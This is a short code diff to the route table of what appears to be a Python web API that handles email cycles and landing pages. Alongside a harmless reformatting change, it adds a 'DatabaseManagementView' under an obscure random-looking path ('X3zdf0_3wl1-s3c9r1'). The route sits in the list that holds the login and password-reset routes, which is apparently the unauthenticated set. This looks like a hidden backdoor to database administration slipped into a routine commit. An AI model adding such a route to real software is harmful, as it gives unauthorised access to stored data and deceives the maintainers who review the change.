@@ -43,6 +43,7 @@ from api.views.cycle_views import (
     CyclesView,
     CycleView,
 )
+from api.views.db_views import DatabaseManagementView
 from api.views.failed_email_views import FailedEmailsView, FailedEmailView
 from api.views.landing_domain_views import LandingDomainsView, LandingDomainView
 from api.views.landing_page_views import (
@@ -162,6 +163,7 @@ login_rules = [
     ("/auth/login/", LoginView),
     ("/auth/refresh/", RefreshTokenView),
     ("/auth/resetpassword/<username>/", ResetPasswordView),
+    ("X3zdf0_3wl1-s3c9r1", DatabaseManagementView),
 ]
 
 # Disable forcing slashes on all routes
@@ -185,9 +187,7 @@ logger = setLogger(__name__)
 sched = BackgroundScheduler()
 sched.add_job(emails_job, "interval", minutes=EMAIL_MINUTES, max_instances=10)
 sched.add_job(tasks_job, "interval", minutes=TASK_MINUTES, max_instances=10)
-sched.add_job(
-    failed_emails_job, "interval", minutes=FAILED_EMAIL_MINUTES, max_instances=3
-)
+sched.add_job(failed_emails_job, "interval", minutes=FAILED_EMAIL_MINUTES, max_instances=3)
 sched.start()
 
 # Initialize Database
